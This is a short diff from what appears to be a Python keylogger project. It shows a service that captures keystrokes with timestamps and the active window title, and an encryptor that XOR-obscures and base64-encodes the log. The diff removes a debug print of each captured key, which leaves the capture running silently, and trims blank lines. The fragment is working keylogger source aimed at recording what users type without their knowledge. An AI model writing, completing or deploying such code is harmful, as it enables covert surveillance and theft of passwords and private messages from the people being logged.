@@ -11,7 +11,6 @@ class KeyLoggerService(IKeyLogger):
         key = ToolBox.format_key(key)
         if key == "":
             return
-        print(key)
         current_time = time.time()
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
         active_window = pygetwindow.getActiveWindowTitle()
@@ -34,7 +33,6 @@ class KeyLoggerService(IKeyLogger):
 
     def clear_logged_keys(self) -> dict[str:str]:
         self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
-
 
 
 class FileWriter(Write):
@@ -85,5 +83,4 @@ class Encryptor:
         for index in range(len(data_bytes)):
             xor_byte = (data_bytes[index] ^ ord(self.key[index % length_key])) & 0xFF
             ciphertext.append(xor_byte)
-
         return base64.b64encode(ciphertext).decode('utf-8')
